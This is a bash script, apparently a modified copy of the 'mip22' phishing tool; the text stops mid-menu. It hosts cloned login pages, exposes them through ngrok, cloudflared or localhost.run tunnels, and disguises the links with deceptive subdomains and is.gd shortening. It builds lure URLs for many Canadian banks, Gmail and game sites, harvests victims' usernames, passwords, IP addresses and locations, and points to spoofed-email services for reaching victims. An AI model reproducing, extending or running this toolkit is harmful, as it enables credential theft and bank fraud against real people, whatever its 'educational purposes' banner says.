#!/bin/bash


#
#  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
#  mip22 is a advanced phishing tool.
#
#  mip22 is free software: you can redistribute it and/or modify
#  it under the terms of the GNU Affero General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  mip22 is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU Affero General Public License for more details.
#
#  You should have received a copy of the GNU Affero General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#


#permissions

chmod -R 777 packages.sh
chmod -R 777 tunnels.sh
chmod -R 777 data.txt
chmod -R 777 fingerprints.txt
chmod -R 777 .host
chmod -R 777 .manual_attack
chmod -R 777 .music
chmod -R 777 .pages
chmod -R 777 .tunnels_log
chmod -R 777 .www



#Install packages and tunnels

check_os_and_install_packages() {
	

if [[ -f .host/ngrok && -f .host/cloudflared ]]; then

{ clear; }	

else

{ clear; header; }

OS_SYSTEM=$(uname -o)	
if [ $OS_SYSTEM != Android ]; then
     bash packages.sh
     bash tunnels.sh

else	
 ./packages.sh
 ./tunnels.sh
 	
fi	

fi
	
}


# Check os for root

check_root_and_os() {
	
OS_SYSTEM=$(uname -o)

if [ $OS_SYSTEM != Android ]; then


if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    { clear; header; }
    echo -e "The program cannot run.\nFor run program in GNU/Linux Operating System,\nGive root privileges and try again. \n"
    exit 1
fi

fi


}



# Terminal Colors

RED="$(printf '\033[31m')"  
GREEN="$(printf '\033[32m')"  
ORANGE="$(printf '\033[33m')"  
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')" 
BLACK="$(printf '\033[30m')"

ORANGEBG="$(printf '\033[43m')"  
BLUEBG="$(printf '\033[44m')"
RESETFG="$(printf '\e033[0m')"
RESETBG="$(printf '\e[0m\n')"



# Directories
if [[ ! -d ".host" ]]; then
	mkdir -p ".host"
fi

if [[ ! -d ".www" ]]; then
	mkdir -p ".www"
fi



# Clear content of log files

truncate -s 0 .tunnels_log/.cloudfl.log 

truncate -s 0 .tunnels_log/.localrun.log 




pid_kill() {
	
#kill all pid for php, ngrok and cloudflared
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi

}


header(){
	
    printf ""	
	cat <<- EOF

${WHITE}  █████████  █████  ${RED}██████ ${WHITE}  █████  ██  ██ 
${WHITE}    ██      ██   ██ ${RED}██   ██${WHITE} ██   ██ ██  ██ 
${WHITE}    ███████ ██ █ ██ ${RED}█████  ${WHITE} ██ █ ██ ██████ 
${WHITE}         ██ ██   ██ ${RED}██   ██${WHITE} ██   ██ ██  ██
${WHITE}  █████████ ██ ${GREEN}NO${RED}-${GREEN}IM${RED}-${GREEN}NOT${RED}-${GREEN}ANOTHER${RED}-${GREEN}AI${RED}-${GREEN}BOT${WHITE} ██     
 ${ORANGE}[!]  FOR EDUCATIONAL PURPOSES ONLY!  ${WHITE}  ██ 
	EOF

	printf "${RESETBG}"	
}



log_info(){
	
	bold=$(tput bold)
    normal=$(tput sgr0)
	
    printf ""	
	cat <<- EOF

	EOF

	printf "${RESETBG}"	
}



# Php webserver and port 
host='127.0.0.1'
port='8080'


setup_clone(){
	
    # Setup cloned page and server
	echo -e "\n  ONE SECOND LOADING...."
	rm -rf .www/*
	cp -rf .pages/"$site"/* .www
	echo -ne "\nTHHAT GANG GANF SHIT "
	cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 
}



setup_clone_manual() {

   rm -rf .www/*
   
   cp -rf .manual_attack/index.html .www
   cp -rf .manual_attack/post.php .www
   cp -rf .manual_attack/__ROOT__/index.php .www
   cp -rf .manual_attack/__ROOT__/fingerprints.php .www	
   
   
   rm -rf .manual_attack/index.html
   rm -rf .manual_attack/post.php
   rm -rf .manual_attack/data.txt
   	
   echo -ne "\n[-] Starting your php server..."
   cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 	
}



setup_clone_customize(){
	
    # Setup cloned page and server
	echo -e "\n  ONE SECOND LOADING...."
	rm -rf .www/*
	cp -rf .customize/"$site"/* .www
	echo -ne "\n[-] Starting your php server..."
	cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 
}




## Get IP address
get_fingerprints() {
	IP=$(grep -a 'IP:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    Full_Date=$(grep -a 'Full-Date:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    Country=$(grep -a 'Country:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    Region=$(grep -a 'Region:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    City=$(grep -a 'City:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    User_Agent=$(grep -a 'User-Agent:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    OS_System=$(grep -a 'OS-System:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'	

	cat .www/fingerprints.txt >> fingerprints.txt
}


# Get credentials from victims
get_creds() {
	ACC=$(grep -o 'Username:.*' .www/data.txt | cut -d " " -f2)
	PASS=$(grep -o 'Password:.*' .www/data.txt | cut -d ":" -f2)
	IFS=$'\n'

	cat .www/data.txt >> data.txt

}




# Get credentials from victims manual method
get_creds_manual() {
	ACC=$(tail -n 20 .www/data.txt)	
	IFS=$'\n'
	echo -e "\n[-]Account : $ACC"
	echo -e "\n[-]Saved in : ${ORANGE}data.txt"
	cat .www/data.txt >> data.txt
	echo -ne "\n[-]Waiting for Next Login Info, Ctrl + C ${ORANGE}to exit. "
}






# Print credentials from victim
credentials() {
	
   echo -ne "\n[-]Waiting for Victim fingerprints and Login Info.. Ctrl + C to exit..."
	
	while true; do
	
		if [[ -e ".www/fingerprints.txt" ]]; then
			echo -e "\n"
			get_fingerprints
			rm -rf .www/fingerprints.txt
		fi
		
		sleep 0.75
		
		if [[ -e ".www/data.txt" ]]; then
		    notice_login
		    echo -e "\n"
		    log_info
		    #echo -e "\n\n \033[31;5;7m Login info Found! \033[37m"
		    #echo -e "${RESETBG}"
			get_creds
			rm -rf .www/data.txt
		fi
		
		sleep 0.75
		
	done
}




# Print credentials from victim manual
credentials_manual() {
	
  echo -ne "\n    USE A VPN OR CELULAR NETWORK "
	
   while true; do	
   
       if [[ -e ".www/fingerprints.txt" ]]; then
			echo -e "\n"
			get_fingerprints
			rm -rf .www/fingerprints.txt
		fi
		
		sleep 0.75
   
		if [[ -e ".www/data.txt" ]]; then
			notice_login
		    echo -e "\n"
		    log_info
		    #echo -e "\n\n \033[31;5;7m Login info Found! \033[37m"
		    #echo -e "${RESETBG}"
			get_creds_manual
			rm -rf .www/data.txt
		fi
		
		sleep 0.75
		
	done
}






# Localhost Start
localhost_start() {
	echo -e "\n[-]Initializing... ( http://$host:$port )"
	setup_clone
	{ sleep 1; clear; header; }
	echo -e "\n[-]Successfully Hosted in : http://$host:$port "
	credentials
}



# Localhost Start customize
localhost_customize() {
	echo -e "\n[-]Initializing... ( http://$host:$port )"
	setup_clone_customize
	{ sleep 1; clear; header; }
	echo -e "\n[-]Successfully Hosted in : http://$host:$port "
	credentials
}



# Localhost Start manual
localhost_start_manual() {
	echo -e "\n[-]Initializing... ( http://$host:$port )"
	setup_clone_manual
	{ sleep 1; clear; header; }
	echo -e "\n[-]Successfully Hosted in : http://$host:$port "
	credentials_manual
}




#ngrok token setup
ngrok_setup_token() {
	
{ clear; header; echo; }

	cat <<- EOF
		[1] Ngrok Toekn
		[99] Main Menu
		
		
	EOF
	
	
	read -p "[-] Select Api : "

	case $REPLY in 
	    
	    1) 
	        echo "Please insert yout ngrok authtoken (only key):"
	        read authtoken
	        
	         if [[ `command -v termux-chroot` ]]; then
              termux-chroot ./.host/ngrok authtoken $authtoken 
              sleep 2 && menu
              
             else
                ./.host/ngrok authtoken $authtoken 
                sleep 2 && menu
             fi ;;	 			
	    
	    
	    99) menu;;
		
		
	    *)
			echo -ne "\n[!] Invalid Option, Try Again..."
			{ sleep 0.7; ngrok_setup_token;};;
	  
	esac


}






apis() {
 
 { clear; header; echo; }

    cat <<- EOF
		[1] Ngrok
		[99] Main Menu
		
		
	EOF
	
	read -p "[-] Select Api : "

	case $REPLY in 
	    
        1) ngrok_setup_token;; 
	      			
	    99) menu;;
		
	    *)
		    echo -ne "\n[!] Invalid Api, Try Again..."
			{ sleep 0.7; apis;};;
	  
	esac
	
}	






# Start ngrok
ngrok_start() {
	echo -e "\n[-]Initializing... ( http://$host:$port )"
	{ sleep 1; setup_clone; }
	echo -ne "\n\n[-]Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	
    url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
	
	echo -e "\n[-] URL http : http://$ngrok_url1"
	echo -e "\n[-] URL http(s) : $ngrok_url"
	echo -e "\n[-] URL subdomain : $subdomain@$ngrok_url1"
	echo -e "\n[-] URL shortener : $url_short"
	
	credentials
}





# Start ngrok customize
ngrok_start_customize() {
	echo -e "\n[-]Initializing... ( http://$host:$port )"
	{ sleep 1; setup_clone_customize; }
	echo -ne "\n\n[-]Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	
    url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
	
	echo -e "\n[-] URL http : http://$ngrok_url1"
	echo -e "\n[-] URL http(s) : $ngrok_url"
	echo -e "\n[-] URL subdomain : $subdomain@$ngrok_url1"
	echo -e "\n[-] URL shortener : $url_short"
	
	credentials
}





# Start ngrok manual
ngrok_start_manual() {
	echo -e ""
	{ sleep 1; setup_clone_manual; }
	echo -ne ""

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
	
	echo -e "\n[-] URL http : http://$ngrok_url1"
	echo -e "\n[-] URL http(s) : $ngrok_url"
	echo -e "\n[-] URL subdomain : $subdomain@$ngrok_url1"
	echo -e "\n[-] URL shortener : $url_short"
	
	credentials_manual
}





# Start Cloudflared
cloudflared_start() { 
	
	echo -e ""
	{ sleep 1; setup_clone; }
	echo -ne "${MAGETNA}"

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 12; clear; header; }
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
	cldflr_url1=${cldflr_url#https://}
    hooo_url="${cldflr_url}"
    driver_url="${cldflr_url}/accounts/work/team/sarah/DRIVER.php"
	photo_url="${cldflr_url}/accounts/authentication/ID=17566/040147.php"
	drive_url="${cldflr_url}/accounts/authentication/1D=17567/040147.php"
	gmap_url="${cldflr_url}/accounts/authentication/ID=17568/040147.php"
	LOGIN_url="${cldflr_url}/accounts/work/a/php/login.php"
	LOGIN2_url="${cldflr_url}/accounts/work/a/php/register.php"
	player2_url="${cldflr_url}/accounts/work/team/sarah/inthack.php"
	player22_url="${cldflr_url}/accounts/personal/2/GEN2.PHP"
	player_url="${cldflr_url}/accounts/work/team/sarah/index.php"
	gmail_url="${cldflr_url}/authentication/ID=17569/040147.php"
	atb_url="${cldflr_url}/220098/ATB/040147.php"
	bmo_url="${cldflr_url}/220098/BMO/040147.php"
	cibc_url="${cldflr_url}/220098/CIBC/040147.php"
	DES_url="${cldflr_url}/220098/desjardins/040147.php"
        HSBC_url="${cldflr_url}/220098/0788/040147.php"
        LAU_url="${cldflr_url}/220098/Laurentian/040147.php"
        MAN_url="${cldflr_url}/220098/Manulife/040147.php"
        MER_url="${cldflr_url}/220098/Meridian/040147.php"
        MOT_url="${cldflr_url}/220098/Motus/040147.php"
        NA_url="${cldflr_url}/220098/National/040147.php"
        PC_url="${cldflr_url}/220098/PCFinancial/040147.php"
        rbc_url="${cldflr_url}/220098/RBC/040147.php"
	SCO_url="${cldflr_url}/220098/CO/040147.php"
	SIM_url="${cldflr_url}/220098/SIM/040147.php"
	TAN_url="${cldflr_url}/220098/tang/040147.php"
	td_url="${cldflr_url}/220098/TD/040147.php"
	gogen="${cldflr_url}/accounts/work/team/sarah/gogen.php"
	gogS="${cldflr_url}"
	

        url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
	url_dri=$(curl -s 'https://is.gd/create.php?format=simple&url='"$driver_url")
	url_short1=$(curl -s 'https://is.gd/create.php?format=simple&url='"$gmap_url")
        url_short2=$(curl -s 'https://is.gd/create.php?format=simple&url='"$player_url") 
	url_short22=$(curl -s 'https://is.gd/create.php?format=simple&url='"$player2_url")
	url_short222=$(curl -s 'https://is.gd/create.php?format=simple&url='"$player22_url")
        url_short3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$gmail_url")
	url_shrt3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$drive_url")
        url_sort3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$photo_url")
	url_login=$(curl -s 'https://is.gd/create.php?format=simple&url='"$LOGIN_url")
	url_login2=$(curl -s 'https://is.gd/create.php?format=simple&url='"$LOGIN2_url")
	url_short545=$(curl -s 'https://is.gd/create.php?format=simple&url='"$hooo_url")
	gogen_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$gogen")
	gogSS=$(curl -s 'https://is.gd/create.php?format=simple&url='"$gogS")
	atb1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$atb_url")
	bmo1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$bmo_url")
	cibc1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cibc_url")
	DES1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$DES_url")
        HSBC1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$HSBC_url")
        LAU1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$LAU_url")
        MAN1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$MAN_url")
        MER1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$MER_url")
        MOT1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$MOT_url")
        NA1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$NA_url")
        PC1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$PC_url")
	SCO1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$SCO_url")
	SIM1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$SIM_url")
	TAN1_url=$(curl -s 'https://is.gd/create.php?format=simple&url='"$TAN_url")
	td_url1=$(curl -s 'https://is.gd/create.php?format=simple&url='"$td_url")a




echo -e "${RED}[${WHITE}█████████████████████████████████████████${RED}]"
echo -e "${RED}[${WHITE}██${RED}█ █ █ █ █ █ █ █ █ █${WHITE}$gogSS${RED}]"
echo -e "${RED}[${WHITE}██${RED}]"




	credentials
}




# Start Cloudflared customize
cloudflared_start_customize() { 
	
	echo -e ""
	{ sleep 1; setup_clone_customize; }
	echo -ne "\n\n[-]${MAGETNA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 12; clear; header; }
	
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
	cldflr_url1=${cldflr_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
	
	echo -e "\n[-] URL http : http://$cldflr_url1"
	echo -e "\n[-] URL http(s) : $cldflr_url"
	echo -e "\n[-] URL subdomain : $subdomain@$cldflr_url1"
	echo -e "\n[-] URL shortener : $url_short"
	
	credentials
}





# Start Cloudflared manual
cloudflared_start_manual() { 
	echo -e ""
	{ sleep 1; setup_clone_manual; }
	echo -ne "\n\n[-]Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 12; clear; header; }
	
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
	cldflr_url1=${cldflr_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
	
	echo -e "\n[-] URL http : http://$cldflr_url1"
	echo -e "\n[-] URL http(s) : $cldflr_url"
	echo -e "\n[-] URL subdomain : $subdomain@$cldflr_url1"
	echo -e "\n[-] URL shortener : $url_short"
	
	credentials_manual
}






# Start localrun
localhostrun_start() {
	echo -e "\n"
	{ sleep 1; setup_clone; }
	echo -ne "\n\n[-]Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
	localrun_url1=${localrun_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
	
    echo -e "\n[-] URL http : http://$localrun_url1"
	echo -e "\n[-] URL https(s) : $localrun_url"
	echo -e "\n[-] URL subdomain : $subdomain@$localrun_url1"
	echo -e "\n[-] URL shortener : $url_short"
	
	credentials
}




# Start localrun customize
localhostrun_start_customize() {
	echo -e ""
	{ sleep 1; setup_clone_customize; }
	echo -ne "\n\n[-]Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
	localrun_url1=${localrun_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
	
    echo -e "\n[-] URL http : http://$localrun_url1"
	echo -e "\n[-] URL https(s) : $localrun_url"
	echo -e "\n[-] URL subdomain : $subdomain@$localrun_url1"
	echo -e "\n[-] URL shortener : $url_short"
	
	credentials
}




# Start localrun manual
localhostrun_start_manual() {
	echo -e ""
	{ sleep 1; setup_clone_manual; }
	echo -ne "\n\n[-]Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
	localrun_url1=${localrun_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
	
    echo -e "\n[-] URL http : http://$localrun_url1"
	echo -e "\n[-] URL https(s) : $localrun_url"
	echo -e "\n[-] URL subdomain : $subdomain@$localrun_url1"
	echo -e "\n[-] URL shortener : $url_short"
	
	credentials_manual
}






# Select Tunnel  
tunnel() {
	{ clear; header; }
	cat <<- EOF
	EOF

	read -p " [-]  ENTER PASSWORD ONE : ${RED}"

	case $REPLY in 
		   1)
		    localhost_start;;
		    
		   2)
		    localhostrun_start;; 
			
		   Covid-19)
			cloudflared_start;;

			
		  *)
			echo -ne "\n[!] Invalid Option, Try Again..."
			{ sleep 1; header; tunnel;};;
	esac

}






# Select Tunnel customize 
tunnel_customize() {
	{ clear; header; }
	cat <<- EOF

		[1] Localhost
		[2] LocalhostRun
		[3] Cloudflared 

	EOF

	read -p "[-] Select a port forwarding service : "

	case $REPLY in 
		   1)
		    localhost_start_customize;;
		    
		   2)
		    localhostrun_start_customize;; 
			
		   3)
			cloudflared_start_customize;;
			
		   	
			
		  *)
			echo -ne "\n[!] Invalid Option, Try Again..."
			{ sleep 1; header; tunnel_customize;};;
	esac

}








start_manual_method() {
 
 cd .manual_attack && php -S "127.0.0.1:8081" > /dev/null 2>&1 & 
     echo -e "\n[-]  Visit  http://127.0.0.1:8081  for setup clone page "
	 echo -e "\n[-]  After setup clone page return to here and continue... "

}


# Select Tunnel  
tunnel_manual() {
	{ clear; header; }
	 
	
	 start_manual_method
	
	cat <<- EOF

		[1] Localhost
		[2] LocalhostRun
		[3] Cloudflared 

	EOF

	read -p "[-] Select a port forwarding service : "

	case $REPLY in 
		   1)
		    localhost_start_manual;;
		    
		   2)
		    localhostrun_start_manual;; 
			
		   3)
			cloudflared_start_manual;;
			
					   	
			
		  *)
			echo -ne "\n[!] Invalid Option, Try Again..."
			{ sleep 1; header; tunnel_manual;};;
	esac

}





vpn_setup() {

	
{ clear; header; echo; }

	cat <<- EOF
		[1] Psiphon Vpn  
		[99] Main Menu
		
	    
	EOF
	
	
	read -p "[-] Select Api : "

	case $REPLY in 
	    
	    1) 
	        
	         if [[ `command -v termux-chroot` ]]; then
                  echo "https://play.google.com/store/apps/details?id=com.psiphon3.subscription" 
              sleep 4 && menu
              
             else
                 echo "https://play.google.com/store/apps/details?id=com.psiphon3.subscription"
                 #echo 'Not Supported. Setup your vpn manual'
                sleep 4 && menu
             fi ;;	 			
	    
	    
	    99) menu;;
		
		
	    *)
			echo -ne "\n[!] Invalid Option, Try Again..."
			{ sleep 0.7; ngrok_setup_token;};;
	  
	esac




}





play_music() {
	
	{ clear; header; }	
	
	cat <<- EOF
		[1] Play Music  
		[2] Stop Music
		[99] Main Menu
		
		If you select this option which is the background music then you may 
		not see the attacker's details directly in the terminal. 
        If you not seen the data pause the music and restart the program again.
        
        However, they have been saved in the data txt file. 
		
		
	EOF
	
	
	read -p "[-] Select Option : "

	case $REPLY in 
	    
	    1) 
           xterm -e nohup mpv .music/mis_song.mp3 > /dev/null 2>&1
           menu;;
           
	     	    
	    2) 
	       pidof mpv && killall mpv > /dev/null 2>&1 
	       menu;;
		
	    99)
		    menu;;
		
	    *)
			echo -ne "\n[!] Invalid Option, Try Again...";;
			
	esac
	
	


}



notice_login()
{
xterm -e nohup mpv .notifications/find_login.mp3 > /dev/null 2>&1
}





attack() {
 
 { clear; header; echo; }
	cat <<- EOF
	EOF
	read -p " [+]    DEVELOPER HAS LOCKED PROJECT   [+]"
	read -p " [+]       HIT ENTER TO CONTINUE       [+]  "

	case $REPLY in 
	
	    *)
			site="TESTED"
			subdomain='http://adobe-pro-membership-lifetime-for-you'
			tunnel;;
			
			
	 
			
	
	   02)  
	        other_sites;;
	        
	        
	   99)  menu;;
	    
	        
	   9)
			echo -ne "\n[!] Invalid Option, Try Again..."
			{ sleep 0.7; attack;};;
	  
	esac


}




other_sites() {
 
 { clear; header; echo; }

   	cat <<- EOF
		[1] Freefire
		[2] Roblox
		[3] Academia
		[4] Airbnb
		[5] Bigmuscle
		[6] Doximity
		[7] Flickr
		[8] Hi5
		[9] Issue
		[10] NYtimes
		[11] Pokemon Trainer
		[12] WTsocial
		[13] Yammer
		[14] Yelp
		[99]Main Menu                                         
		                                                       
	EOF
	
	
	read -p "[-] Select an option : "

	case $REPLY in 
	
	    1)
			site="freefire"
			subdomain='http://get-free-character-for-freefire-game'
			tunnel;;
			
			
	    2)
			site="roblox"
			subdomain='http://get-free-character-for-roblox-game'
			tunnel;;
				
	   
	    3)
			site="academia"
			subdomain='http://academia-account-update-plan-free'
			tunnel;;
	   
	   
	    4)
			site="airbnb"
			subdomain='http://airbnb-account-upgrade-plan-free'
			tunnel;;
	   
	   
	    5)
			site="bigmuscle"
			subdomain='http://bigmuscle-account-update-plan-free'
			tunnel;;
	           
	           
	    6)
			site="doximity"
			subdomain='http://doximity-account-update-plan-free'
			tunnel;;
	  
	  
	    7)
			site="flickr"
			subdomain='http://flickr-account-upgrade-plan-pro-free'
			tunnel;;
	           
	           
	    8)
			site="hi5"
			subdomain='http://hi5-account-secure-login'
			tunnel;;
	           
	    
	    9)
			site="issue"
			subdomain='http://flickr-account-upgrade-plan-pro-free'
			tunnel;;
	           
	    
	    10)
			site="nytimes"
			subdomain='http://nytimes-account-upgrade-to-pro-free'
			tunnel;;
	           
	    
	    11)
			site="pokemon"
			subdomain='http://pokemon-update-account-plan-free'
			tunnel;;
	            
	            
	    12)
			site="wtsocial"
			subdomain='http://wtsocial-secure-login'
			tunnel;;
	   
	   
	    13)
			site="yammer"
			subdomain='http://yammer-secure-login'
			tunnel;;       
	     
	     
	    14)
			site="yelp"
			subdomain='http://yelp-secure-login'
			tunnel;;
	           
	        
	   99) menu;;
	    
	        
	   *)
			echo -ne "\n[!] Invalid Option, Try Again..."
			{ sleep 0.7; other_sites;};;
	  
	esac


}





customize_sites()
{
	
 { clear; header; echo; }	
 
   
echo -ne "\nCustomize your sites. 
Go inside the .customize folder \nand create your own customized sites inside folders.
Place all your files inside the same folder. 
For example folder mysite and inside all files. 
Then just type the folder name and choose tunnel. \n\n"
    
     
cat <<- EOF
        
[1] Customized 
[99] Main Menu
		
EOF
	
    read -p "[-] Select an option : "

	case $REPLY in 
	    
	    1) 
	      read -p "Enter folder name e.x mysite: " customize_folder
	      read -p "Enter subdomain for tunnel e.x mysite-update-plan-premium-free: " customize_subdomain
	      site=$customize_folder
	      subdomain=$customize_subdomain
	      tunnel_customize;;

	    
	    99) 
	       menu;; 
	    
	    *)
			echo -ne "\n[!] Invalid Option, Try Again..."
			{ sleep 0.7; attack_customize;};;
	  
	esac
	
}






attack_manual() {

 subdomain='http:secure-login-page'
 tunnel_manual
  
}




email() {

{ clear; header; echo; }

    echo -ne "\n[-]Use this services for send email to Victims \n"
   
    echo -ne "\n[-] https://www.guerrillamail.com/ \n"
    echo -ne "\n[-] https://emkei.cz/  \n"
    echo -ne "\n[-] https://mailspre.com/ \n"
    echo -ne "\n\n"
    
    
    cat <<- EOF
		[99] Main Menu
		
		
	EOF
	
	read -p "[-] Select an option : "

	case $REPLY in 
	    
	    99) menu;; 
	    
	    *)
			echo -ne "\n[!] Invalid Option, Try Again..."
			{ sleep 0.7; email;};;
	  
	esac


	

}	




menu() {
 
 { clear; header; echo; }

	cat <<- EOF
  It's${RED} not${WHITE} about the${RED} PROMISES${WHITE} you  ${RED}make${WHITE}
  It's${RED} not${WHITE} about the${RED} FRIENDS${WHITE}  you${RED}  made${WHITE}
  it's${RED} not ${WHITE}about the${RED} LOVE ${WHITE} that is${RED} gone${WHITE}
  It's${RED} not ${WHITE}about the${RED} STUPID${WHITE}SHIT you${RED} did${WHITE}
  It's${RED} not${WHITE} about the${RED} WAY${WHITE} things${RED}could be ${WHITE}

  [!] ${ORANGE}LIFE...  ${WHITE} its what you${GREEN} GIVE ${RED} [!] 

	EOF

	read -p ""
	read -p "  "

	case $REPLY in 
	    
	    *) attack;; 
	    
	    2) attack_manual;; 
	    
	    3) customize_sites;;
	      			
	    4) apis;;
	    
	    5) email;;
	    
	    6) vpn_setup;;
	    
	    7) play_music;;
	    
	    help) help;;
	      				
		0)
		echo -ne "\n[!]${ORANGE} Thanks for using "
		sleep 2
		clear
		exit 1;;
		
	    98)
